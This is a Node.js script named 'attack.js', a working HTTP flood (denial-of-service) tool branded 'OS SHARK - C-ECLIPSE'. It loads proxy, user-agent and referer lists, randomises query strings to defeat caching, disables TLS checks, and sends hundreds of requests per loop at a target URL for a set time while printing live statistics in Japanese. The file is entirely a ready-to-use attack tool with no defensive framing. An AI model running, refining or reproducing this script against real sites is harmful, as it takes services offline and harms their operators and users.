const https = require('https');
const fs = require('fs');
const url = require('url');
const randstr = require('randomstring');
const HttpsProxyAgent = require('https-proxy-agent');

if (process.argv.length < 4) {
    console.log('Usage: node attack.js <target> <time>');
    process.exit(1);
}

const target = process.argv[2];
const time = parseInt(process.argv[3]);
const parsed = url.parse(target);

// Read in assets
const uas = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);
const referers = fs.readFileSync('refs.txt', 'utf-8').split('\n').filter(Boolean);
const proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);

// Clear terminal and print startup
console.clear();
console.log(`\n===OS SHARK - C-ECLIPSE===\n`);

let totalSent = 0;
let successCount = 0;
let failCount = 0;
let rps = 0;
let lastSent = 0;
const endTime = Date.now() + time * 1000;

function ra() {
    return randstr.generate({ charset: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', length: 8 });
}

function sendRequest() {
    const path = parsed.path.includes('%RAND%') ? parsed.path.replace('%RAND%', ra()) : parsed.path;
    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    const agent = new HttpsProxyAgent('http://' + proxy);

    const options = {
        hostname: parsed.hostname,
        port: 443,
        path: path + '?' + ra(),
        method: 'GET',
        headers: {
            'User-Agent': uas[Math.floor(Math.random() * uas.length)],
            'Referer': referers[Math.floor(Math.random() * referers.length)],
            'Connection': 'keep-alive'
        },
        agent: agent,
        rejectUnauthorized: false
    };

    const req = https.request(options, (res) => {
        totalSent++;
        if (res.statusCode >= 200 && res.statusCode < 300) {
            successCount++;
        } else if (res.statusCode >= 400) {
            failCount++;
        }
    });

    req.on('error', () => {
        totalSent++;
        failCount++;
    });

    req.end();
}

function flood() {
    if (Date.now() > endTime) return;
    for (let i = 0; i < 250; i++) { // boost threads
        sendRequest();
    }
    setImmediate(flood);
}

// Stat printer
setInterval(() => {
    console.clear();
    console.log(`===OS SHARK - C-ECLIPSE===`);
    console.log(`総送信数: ${totalSent}`);
    console.log(`リクエスト毎秒: ${totalSent - lastSent}`);
    console.log(`成功数 (2xx): ${successCount}`);
    console.log(`失敗数 (4xx): ${failCount}`);
    const remaining = Math.max(0, Math.floor((endTime - Date.now()) / 1000));
    console.log(`残り時間: ${remaining} 秒`);
    lastSent = totalSent;
}, 300);

// End handler
setTimeout(() => {
    console.clear();
    console.log("攻撃が完了しました。"); // Attack finished.
    process.exit(0);
}, time * 1000);

flood();
